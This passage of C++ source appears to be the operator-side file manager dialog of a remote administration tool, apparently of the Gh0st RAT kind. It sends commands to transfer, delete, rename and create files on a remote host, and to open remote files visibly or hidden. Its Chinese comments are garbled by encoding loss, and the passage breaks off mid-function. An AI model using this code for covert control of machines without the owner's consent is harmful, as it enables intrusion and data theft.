        CString fileName = m_strReceiveLocalFile.Right(m_strReceiveLocalFile.GetLength() - nPos - 1 );

        m_strReceiveLocalFile.Format("%s%s",m_Local_Path,fileName);
    } else
        m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);

    // �������Ŀ¼
    MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));


    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);


    if (hFind != INVALID_HANDLE_VALUE
        && m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL
        && m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
        && m_nTransferMode != TRANSFER_MODE_JUMP_ALL
       ) {
        bIsLocalDlg = TRUE;
        SendMessage(WM_SHOW_DLG,0,0);
    }

    if (m_nTransferMode == TRANSFER_MODE_CANCEL) {
        // ȡ������
        m_bIsStop = true;
        SendStop();
        return;
    }
    int	nTransferMode;
    switch (m_nTransferMode) {
    case TRANSFER_MODE_OVERWRITE_ALL:
        nTransferMode = TRANSFER_MODE_OVERWRITE;
        break;
    case TRANSFER_MODE_ADDITION_ALL:
        nTransferMode = TRANSFER_MODE_ADDITION;
        break;
    case TRANSFER_MODE_JUMP_ALL:
        nTransferMode = TRANSFER_MODE_JUMP;
        break;
    default:
        nTransferMode = m_nTransferMode;
    }

    //  1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
    BYTE	bToken[9];
    DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ
    memset(bToken, 0, sizeof(bToken));
    bToken[0] = COMMAND_CONTINUE;

    // �ļ��Ѿ�����
    if (hFind != INVALID_HANDLE_VALUE) {
        // ��ʾ��ʲô
        // ���������
        if (nTransferMode == TRANSFER_MODE_ADDITION) {
            memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
            memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
            // ���յĳ��ȵ���
            m_nCounter += FindFileData.nFileSizeHigh * (MAXDWORD);
            m_nCounter += FindFileData.nFileSizeLow;

            dwCreationDisposition = OPEN_EXISTING;
        }
        // ����
        else if (nTransferMode == TRANSFER_MODE_OVERWRITE) {
            // ƫ����0
            memset(bToken + 1, 0, 8);
            // ���´���
            dwCreationDisposition = CREATE_ALWAYS;

        }
        // ������ָ���Ƶ�-1
        else if (nTransferMode == TRANSFER_MODE_JUMP) {
            m_ProgressCtrl->SetPos(100);
            DWORD dwOffset = -1;
            memcpy(bToken + 5, &dwOffset, 4);
            dwCreationDisposition = OPEN_EXISTING;
        }
    } else {
        // ƫ����0
        memset(bToken + 1, 0, 8);
        // ���´���
        dwCreationDisposition = CREATE_ALWAYS;
    }
    FindClose(hFind);


    HANDLE	hFile =
        CreateFile
        (
            m_strReceiveLocalFile.GetBuffer(0),
            GENERIC_WRITE,
            FILE_SHARE_WRITE,
            NULL,
            dwCreationDisposition,
            FILE_ATTRIBUTE_NORMAL,
            0
        );
    // ��Ҫ������
    if (hFile == INVALID_HANDLE_VALUE) {
        m_nOperatingFileLength = 0;
        m_nCounter = 0;
        ::MessageBox(m_hWnd, m_strReceiveLocalFile + " �ĵ�����ʧ��!", "Warning", MB_OK|MB_ICONWARNING);
        CloseHandle(hFile);
        return;
    }
    CloseHandle(hFile);

    ShowProgress();
    if (m_bIsStop) {
        SendStop();
    } else {
        // ���ͼ��������ļ���token,�����ļ�������ƫ��
        m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
    }
}

// д���ļ�����
void CFileManagerDlg::WriteLocalRecvFile()
{
    // �������
    BYTE	*pData;
    DWORD	dwBytesToWrite;
    DWORD	dwBytesWrite;
    int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
    FILESIZE	*pFileSize;
    // �õ����ݵ�ƫ��
    pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

    pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
    // �õ��������ļ��е�ƫ��, ��ֵ��������
    m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

    LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
    LONG	dwOffsetLow = pFileSize->dwSizeLow;


    dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

    HANDLE	hFile =
        CreateFile
        (
            m_strReceiveLocalFile.GetBuffer(0),
            GENERIC_WRITE,
            FILE_SHARE_WRITE,
            NULL,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0
        );

    SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

    int nRet = 0;
    int i;
    for (i = 0; i < 15; i++) {
        // д���ļ�
        nRet = WriteFile
               (
                   hFile,
                   pData,
                   dwBytesToWrite,
                   &dwBytesWrite,
                   NULL
               );
        if (nRet > 0) {
            break;
        }
    }
    if (i == 15 && nRet <= 0) {
        /*Document creation failed*/
        ::MessageBox(m_hWnd, m_strReceiveLocalFile + " �ĵ�д��ʧ��!", "Warning", MB_OK|MB_ICONWARNING);
    }
    CloseHandle(hFile);
    // Ϊ�˱Ƚϣ�����������
    m_nCounter += dwBytesWrite;
    ShowProgress();
    if (m_bIsStop)
        SendStop();
    else {
        BYTE	bToken[9];
        bToken[0] = COMMAND_CONTINUE;
        dwOffsetLow += dwBytesWrite;
        memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
        memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
        m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
    }
}

// ��ֹ���ؽ����ļ�
void CFileManagerDlg::EndLocalRecvFile()
{
    m_nCounter = 0;
    m_strOperatingFile = "";
    m_nOperatingFileLength = 0;

    if (m_Remote_Download_Job.IsEmpty() || m_bIsStop) {
        m_Remote_Download_Job.RemoveAll();
        m_bIsStop = false;
        // ���ô��䷽ʽ
        m_nTransferMode = TRANSFER_MODE_NORMAL;
        EnableControl(TRUE);
        FixedLocalFileList(".");
        m_ProgressCtrl->SetWindowText("");

        strShowText.Format(_T("����: װ��Ŀ¼ %s \\ *. * ���"), m_Local_Path);
        PostMessage(WM_SHOW_MSG,0,0);
//		ShowMessage(_T("����: װ��Ŀ¼ %s \\ *. * ���"), m_Local_Path);
    } else {
        // �ҿ�����sleep�»�������˿�����ǰ�����ݻ�ûsend��ȥ
        Sleep(5);
        SendDownloadJob();
    }
    return;
}
// ��ֹ�����ϴ��ļ�
void CFileManagerDlg::EndLocalUploadFile()
{
    m_nCounter = 0;
    m_strOperatingFile = "";
    m_nOperatingFileLength = 0;

    if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop) {
        m_Remote_Upload_Job.RemoveAll();
        m_bIsStop = false;
        EnableControl(TRUE);
        GetRemoteFileList(".");
        m_ProgressCtrl->SetWindowText("");
        strShowText.Format(_T("Զ�̣�װ��Ŀ¼ %s\\*.* ���"), m_Remote_Path);
        PostMessage(WM_SHOW_MSG,0,0);
        //ShowMessage(_T("Զ�̣�װ��Ŀ¼ %s\\*.* ���"), m_Remote_Path);
    } else {
        // �ҿ�����sleep�»�������˿�����ǰ�����ݻ�ûsend��ȥ
        Sleep(5);
        SendUploadJob();
    }
    return;
}
// ��ֹԶ��ɾ���ļ�
void CFileManagerDlg::EndRemoteDeleteFile()
{
    if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop) {
        m_bIsStop = false;
        EnableControl(TRUE);

        if (m_list_remote_search.IsWindowVisible())
            return;

        GetRemoteFileList(".");

        //ShowMessage(_T("Զ�̣�װ��Ŀ¼ %s\\*.* ���"), m_Remote_Path);
    } else {
        // �ҿ�����sleep�»�������˿�����ǰ�����ݻ�ûsend��ȥ
        Sleep(5);
        SendDeleteJob();
    }
    return;
}

void CFileManagerDlg::EndRemoteMoveFile()
{
    if (m_Remote_Move_Job.IsEmpty() || m_bIsStop) {
        m_bIsStop = false;
        EnableControl(TRUE);

        if (m_list_remote_search.IsWindowVisible())
            return;

        GetRemoteFileList(".");

        //ShowMessage(_T("Զ�̣�װ��Ŀ¼ %s\\*.* ���"), m_Remote_Path);
    } else {
        // �ҿ�����sleep�»�������˿�����ǰ�����ݻ�ûsend��ȥ
        Sleep(5);
        SendMoveJob();
    }
    return;
}

void CFileManagerDlg::SendStop()
{
    BYTE	bBuff = COMMAND_STOP;
    m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::ShowProgress()
{
    char	*lpDirection = NULL;
    if (m_bIsUpload)
        lpDirection = "�����ļ�";
    else
        lpDirection = "�����ļ�";


    if ((int)m_nCounter == -1) {
        m_nCounter = m_nOperatingFileLength;
    }

    int	progress = (int)((m_nCounter * 100) / m_nOperatingFileLength);
    strShowText.Format(_T("%s %s %dKB (%d%%)"), lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
    PostMessage(WM_SHOW_MSG,0,0);

    m_ProgressCtrl->SetWindowText("��ESC����");
    m_ProgressCtrl->SetTextColor(RGB(255,128,0));

    //ShowMessage(_T("%s %s %dKB (%d%%)"), lpDirection, m_strOperatingFile, (int)(m_nCounter / 1024), progress);
    m_ProgressCtrl->SetPos(progress);

    if (m_nCounter == m_nOperatingFileLength) {
        m_nCounter = m_nOperatingFileLength = 0;
    }
}

// ����ɾ���ļ�
void CFileManagerDlg::OnLocalDelete()
{
    m_bIsUpload = true;
    CString str;
    if (m_list_local.GetSelectedCount() > 1)
        str.Format(_T("ȷ��Ҫ���� %d ��ɾ����?"), m_list_local.GetSelectedCount());
    else {
        CString file = m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
        if (m_list_local.GetItemData(m_list_local.GetSelectionMark()) == 1)
            str.Format(_T("ȷʵҪɾ���ļ��С�%s��������������ɾ����?"), file);
        else
            str.Format(_T("ȷʵҪ�ѡ�%s��ɾ����?"), file);
    }
    if (::MessageBox(m_hWnd, str, "ȷ��ɾ��", MB_YESNO|MB_ICONQUESTION) == IDNO)
        return;

    EnableControl(FALSE);

    POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
    while(pos) { //so long as we have a valid POSITION, we keep iterating
        int nItem = m_list_local.GetNextSelectedItem(pos);
        CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
        // �����Ŀ¼
        if (m_list_local.GetItemData(nItem)) {
            file += '\\';
            DeleteDirectory(file);
        } else {
            DeleteFile(file);
        }
    } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
    // �����ļ�������
    EnableControl(TRUE);

    FixedLocalFileList(".");
}

// Զ��ɾ���ļ�
void CFileManagerDlg::OnRemoteDelete()
{
    m_bIsUpload = false;
    // TODO: Add your command handler code here
    CString str;

    if(m_list_remote_search.IsWindowVisible()) {

        if (m_list_remote_search.GetSelectedCount() > 1)
            str.Format(_T("ȷ��Ҫ���� %d ��ɾ����?"), m_list_remote_search.GetSelectedCount());
        else {
            CString file = m_list_remote_search.GetItemText(m_list_remote_search.GetSelectionMark(), 0);
            if (m_list_remote_search.GetItemData(m_list_remote_search.GetSelectionMark()) == 1)
                str.Format(_T("ȷʵҪɾ���ļ��С�%s��������������ɾ����?"), file);
            else
                str.Format(_T("ȷʵҪ�ѡ�%s��ɾ����?"), file);
        }
        if (::MessageBox(m_hWnd, str, "ȷ��ɾ��", MB_YESNO|MB_ICONQUESTION) == IDNO)
            return;

        m_Remote_Delete_Job.RemoveAll();

        POSITION pos = m_list_remote_search.GetFirstSelectedItemPosition(); //iterator for the CListCtrl

        while(pos) { //so long as we have a valid POSITION, we keep iterating
            int nItem = m_list_remote_search.GetNextSelectedItem(pos);
            CString	file = m_list_remote_search.GetItemText(nItem, 0);
            // �����Ŀ¼
            if (m_list_remote_search.GetItemData(nItem))
                file += '\\';
            m_Remote_Delete_Job.AddTail(file);
        } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
    } else {
        if (m_list_remote.GetSelectedCount() > 1)
            str.Format(_T("ȷ��Ҫ���� %d ��ɾ����?"), m_list_remote.GetSelectedCount());
        else {
            CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);
            if (m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) == 1)
                str.Format(_T("ȷʵҪɾ���ļ��С�%s��������������ɾ����?"), file);
            else
                str.Format(_T("ȷʵҪ�ѡ�%s��ɾ����?"), file);
        }
        if (::MessageBox(m_hWnd, str, "ȷ��ɾ��", MB_YESNO|MB_ICONQUESTION) == IDNO)
            return;
        m_Remote_Delete_Job.RemoveAll();
        POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
        while(pos) { //so long as we have a valid POSITION, we keep iterating
            int nItem = m_list_remote.GetNextSelectedItem(pos);
            CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
            // �����Ŀ¼
            if (m_list_remote.GetItemData(nItem))
                file += '\\';

            m_Remote_Delete_Job.AddTail(file);
        } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

    }

    EnableControl(FALSE);
    // ���͵�һ��ɾ������
    SendDeleteJob();
}

void CFileManagerDlg::OnRemoteStop()
{
    // TODO: Add your command handler code here
    m_bIsStop = true;
}

void CFileManagerDlg::OnLocalStop()
{
    // TODO: Add your command handler code here
    m_bIsStop = true;
}

void CFileManagerDlg::SendTransferMode() //
{
    bIsLocalDlg = FALSE;
    SendMessage(WM_SHOW_DLG,0,0);

    if (m_nTransferMode == TRANSFER_MODE_CANCEL) {
        m_bIsStop = true;
        EndLocalUploadFile();
        return;
    }

    BYTE bToken[5];
    bToken[0] = COMMAND_SET_TRANSFER_MODE;
    memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
    m_iocpServer->Send(m_pContext, (unsigned char *)&bToken, sizeof(bToken));

}

void CFileManagerDlg::SendFileData()
{
    FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
    LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
    LONG	dwOffsetLow = pFileSize->dwSizeLow;

    m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

    ShowProgress();


    if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop) {
        EndLocalUploadFile();
        return;
    }

    HANDLE	hFile;
    hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) {
        TRACE("CFileManagerDlg SendFileData ERRO 1\r\n");
        return;
    }

    SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

    int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9

    DWORD	nNumberOfBytesToRead = 1024 * 2 - nHeadLength;
    DWORD	nNumberOfBytesRead = 0;
    BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, 1024 * 2);
    // Token,  ��С��ƫ�ƣ�����
    lpBuffer[0] = COMMAND_FILE_DATA;
    memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
    memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));
    // ����ֵ
    bool	bRet = true;
    ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
    CloseHandle(hFile);


    if (nNumberOfBytesRead > 0) {
        int	nPacketSize = nNumberOfBytesRead + nHeadLength;
        m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
    }
    LocalFree(lpBuffer);
}


//  �˴��ĸ� ������д ���� ճ�� �����ļ�
bool CFileManagerDlg::DeleteDirectory(LPCTSTR lpszDirectory)
{
    WIN32_FIND_DATA	wfd;
    char	lpszFilter[MAX_PATH];

    wsprintf(lpszFilter, "%s\\*.*", lpszDirectory);

    HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
    if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
        return FALSE;

    do {
        if (wfd.cFileName[0] != '.') {
            if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                char strDirectory[MAX_PATH];
                wsprintf(strDirectory, "%s\\%s", lpszDirectory, wfd.cFileName);
                DeleteDirectory(strDirectory);
            } else {
                char strFile[MAX_PATH];
                wsprintf(strFile, "%s\\%s", lpszDirectory, wfd.cFileName);
                DeleteFile(strFile);
            }
        }
    } while (FindNextFile(hFind, &wfd));

    FindClose(hFind); // �رղ��Ҿ��

    if(!RemoveDirectory(lpszDirectory)) {
        return FALSE;
    }
    return true;
}

// �����½��ļ���
void CFileManagerDlg::OnLocalNewfolder()
{
    if (m_Local_Path == "")
        return;
    // TODO: Add your command handler code here
    CInputDialog	dlg;
    dlg.Init(_T("�½�Ŀ¼"), _T("������Ŀ¼����:"),this);

    if (dlg.DoModal() == IDOK && dlg.m_str.GetLength()) {
        // �������Ŀ¼
        MakeSureDirectoryPathExists(m_Local_Path + dlg.m_str + "\\");
        FixedLocalFileList(".");
    }
}

void CFileManagerDlg::OnRemoteNewfolder()
{
    if (m_Remote_Path == "" || m_list_remote_search.IsWindowVisible())
        return;
    // TODO: Add your command handler code here
    CInputDialog	dlg;
    dlg.Init(_T("�½�Ŀ¼"), _T("������Ŀ¼����:"),this);

    if (dlg.DoModal() == IDOK && dlg.m_str.GetLength()) {
        CString file = m_Remote_Path + dlg.m_str + "\\";
        UINT	nPacketSize = file.GetLength() + 2;
        // �������Ŀ¼
        LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
        lpBuffer[0] = COMMAND_CREATE_FOLDER;
        memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
        m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
        LocalFree(lpBuffer);
    }
}

// ����
void CFileManagerDlg::OnTransfer()
{
    // TODO: Add your command handler code here
    POINT pt;
    GetCursorPos(&pt);
    if (GetFocus()->m_hWnd == m_list_local.m_hWnd) {
        OnLocalCopy();
    } else {
        OnRemoteCopy();
    }
}

// ������
void CFileManagerDlg::OnRename()
{
    // TODO: Add your command handler code here
    POINT pt;
    GetCursorPos(&pt);
    if (GetFocus()->m_hWnd == m_list_local.m_hWnd) {
        m_list_local.EditLabel(m_list_local.GetSelectionMark());
    } else {
        m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
    }
}

// ���ص���������
void CFileManagerDlg::OnEndlabeleditListLocal(NMHDR* pNMHDR, LRESULT* pResult)
{
    LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
    // TODO: Add your control notification handler code here
    CString str, strExistingFileName, strNewFileName;
    m_list_local.GetEditControl()->GetWindowText(str);

    strExistingFileName = m_Local_Path + m_list_local.GetItemText(pDispInfo->item.iItem, 0);
    strNewFileName = m_Local_Path + str;
    *pResult = ::MoveFile(strExistingFileName.GetBuffer(0), strNewFileName.GetBuffer(0));
}

// Զ�̵���������
void CFileManagerDlg::OnEndlabeleditListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    LV_DISPINFO* pDispInfo = (LV_DISPINFO*)pNMHDR;
    // TODO: Add your control notification handler code here
    CString str, strExistingFileName, strNewFileName;
    m_list_remote.GetEditControl()->GetWindowText(str);

    strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
    strNewFileName = m_Remote_Path + str;

    if (strExistingFileName != strNewFileName) {
        UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
        LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
        lpBuffer[0] = COMMAND_RENAME_FILE;
        memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
        memcpy(lpBuffer + 2 + strExistingFileName.GetLength(),
               strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
        m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
        LocalFree(lpBuffer);
    }
    *pResult = 1;
}

void CFileManagerDlg::OnDelete()
{
    // TODO: Add your command handler code here
    POINT pt;
    GetCursorPos(&pt);
    if (GetFocus()->m_hWnd == m_list_local.m_hWnd) {
        OnLocalDelete();
    } else {
        OnRemoteDelete();
    }
}

void CFileManagerDlg::OnNewfolder()
{
    // TODO: Add your command handler code here
    POINT pt;
    GetCursorPos(&pt);
    if (GetFocus()->m_hWnd == m_list_local.m_hWnd) {
        OnLocalNewfolder();
    } else {
        OnRemoteNewfolder();
    }
}

// ˢ��
void CFileManagerDlg::OnRefresh()
{
    // TODO: Add your command handler code here
    if (m_list_remote_search.IsWindowVisible()) {
        OnSearchStart();
        return;
    }
    POINT pt;
    GetCursorPos(&pt);
    if (GetFocus()->m_hWnd == m_list_local.m_hWnd) {
        FixedLocalFileList(".");
    } else {
        GetRemoteFileList(".");
    }
}

// ���ش�
void CFileManagerDlg::OnLocalOpen()
{
    // TODO: Add your command handler code here
    CString	str;
    str = m_Local_Path + m_list_local.GetItemText(m_list_local.GetSelectionMark(), 0);
    ShellExecute(NULL, "open", str, NULL, NULL, SW_SHOW);
}

// Զ�̴�
void CFileManagerDlg::OnRemoteOpenShow()
{
    // TODO: Add your command handler code here
    CInputDialog	dlg;
    dlg.Init(_T("Զ�̴� - ��ʾ"), _T("�������ѡ�Ĳ���(��֪�������ȷ��):"),this,FALSE);

    if (dlg.DoModal() != IDOK)
        return;

    CString	str;
    if (m_list_remote_search.IsWindowVisible())
        str = m_list_remote_search.GetItemText(m_list_remote_search.GetSelectionMark(), 0);
    else
        str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

    if (dlg.m_str.GetLength() != 0) {
        str += " ";
        str += dlg.m_str;
    }

    int		nPacketLength = str.GetLength() + 2;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
    memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnRemoteOpenHide()
{
    // TODO: Add your command handler code here
    CInputDialog	dlg;
    dlg.Init(_T("Զ�̴� - ����"), _T("�������ѡ�Ĳ���(��֪�������ȷ��):"),this,FALSE);

    if (dlg.DoModal() != IDOK)
        return;

    CString	str;
    if (m_list_remote_search.IsWindowVisible())
        str = m_list_remote_search.GetItemText(m_list_remote_search.GetSelectionMark(), 0);
    else
        str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

    if (dlg.m_str.GetLength() != 0) {
        str += " ";
        str += dlg.m_str;
    }

    int		nPacketLength = str.GetLength() + 2;
    LPBYTE	lpPacket = (LPBYTE)LocalAlloc(LPTR, nPacketLength);
    lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
    memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
    m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
    //delete [] lpPacket;
    LocalFree(lpPacket);
}

void CFileManagerDlg::OnRclickListLocal(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    CListCtrl	*pListCtrl = &m_list_local;
    CMenu	popup;
    popup.LoadMenu(IDR_FILEMANAGER);
    CMenu*	pM = popup.GetSubMenu(0);
    CPoint	p;
    GetCursorPos(&p);
    pM->DeleteMenu(ID_MENUITEM_PASTE, MF_BYCOMMAND); // ���ļ�λ��
    pM->DeleteMenu(ID_MENUITEM_COPY, MF_BYCOMMAND); // ���ļ�λ��
    pM->DeleteMenu(ID_MENUITEM_MOVE, MF_BYCOMMAND); // ���ļ�λ��
    pM->DeleteMenu(ID_MENUITEM_OPEN_FILEPATH, MF_BYCOMMAND); // ���ļ�λ��
    pM->DeleteMenu(9, MF_BYCOMMAND); //�ָ���
    pM->DeleteMenu(6, MF_BYPOSITION);

    // ������������ļ��б� ���ñ����ϴ�MENU
    if (!m_list_remote.IsWindowVisible())
        pM->EnableMenuItem(IDM_TRANSFER,MF_DISABLED);

    if (pListCtrl->GetSelectedCount() == 0) {
        int	count = pM->GetMenuItemCount();
        for (int i = 0; i < count; i++) {
            pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
        }
    }
    if (pListCtrl->GetSelectedCount() <= 1) {
        pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
    }
    if (pListCtrl->GetSelectedCount() == 1) {
        // ���ļ���
        if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
            pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);
        else
            pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_ENABLED);
    } else
        pM->EnableMenuItem(IDM_LOCAL_OPEN, MF_BYCOMMAND | MF_GRAYED);


    pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);


    CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);

    *pResult = 0;
}

void CFileManagerDlg::OnRclickListRemote(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    int	nRemoteOpenMenuIndex = 5;
    CListCtrl	*pListCtrl = &m_list_remote;
    CMenu	popup;
    popup.LoadMenu(IDR_FILEMANAGER);
    CMenu*	pM = popup.GetSubMenu(0);
    CPoint	p;
    GetCursorPos(&p);
    pM->DeleteMenu(ID_MENUITEM_OPEN_FILEPATH, MF_BYCOMMAND); // ���ļ�λ��
    pM->DeleteMenu(9, MF_BYCOMMAND); //�ָ���
    pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);

    if (pListCtrl->GetSelectedCount() == 0) {
        int	count = pM->GetMenuItemCount();
        for (int i = 0; i < count; i++) {
            pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
        }
    }

    if (pListCtrl->GetSelectedCount() <= 1) {
        pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);

    }
    if (pListCtrl->GetSelectedCount() == 1) {
        // ���ļ���
        if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
            pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION| MF_GRAYED);
        else
            pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
    } else
        pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);


    pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);

    pM->EnableMenuItem(9, MF_BYPOSITION | MF_ENABLED);
    pM->EnableMenuItem(10, MF_BYPOSITION | MF_ENABLED);

//	if(!m_Remote_Move_Job.IsEmpty() && !m_list_remote_search.IsWindowVisible())
    pM->EnableMenuItem(11, MF_BYPOSITION | MF_ENABLED);

    CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);

    *pResult = 0;
}

void CFileManagerDlg::OnRclickListRemoteSearch(NMHDR* pNMHDR, LRESULT* pResult)
{
    // TODO: Add your control notification handler code here
    int	nRemoteOpenMenuIndex = 5;

    CListCtrl	*pListCtrl = &m_list_remote_search;
    CMenu	popup;
    popup.LoadMenu(IDR_FILEMANAGER);
    CMenu*	pM = popup.GetSubMenu(0);
    CPoint	p;
    GetCursorPos(&p);

    pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);

    if (pListCtrl->GetSelectedCount() == 0) { // ɶҲûѡ��  ȫ������
        int	count = pM->GetMenuItemCount();
        for (int i = 0; i < count; i++) {
            pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
        }
    }


    // ���������� �½��ļ��� �˵�
    pM->EnableMenuItem(IDM_RENAME, MF_BYCOMMAND | MF_GRAYED);
    pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_GRAYED);

    if (pListCtrl->GetSelectedCount() == 1) { // ���ѡ����Ϊ1
        // ���ļ���
        if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
            pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION| MF_GRAYED);
        else {
            pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
            pM->EnableMenuItem(ID_MENUITEM_OPEN_FILEPATH, MF_BYPOSITION | MF_ENABLED);
        }
    } else {
        pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);
        pM->EnableMenuItem(ID_MENUITEM_OPEN_FILEPATH, MF_BYCOMMAND | MF_GRAYED);
    }

    pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);

    CXTPCommandBars::TrackPopupMenu(pM, 0, p.x, p.y,this);

    *pResult = 0;
}


// �������Ŀ¼
bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.

    __try {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        lstrcpy(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\'))) {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

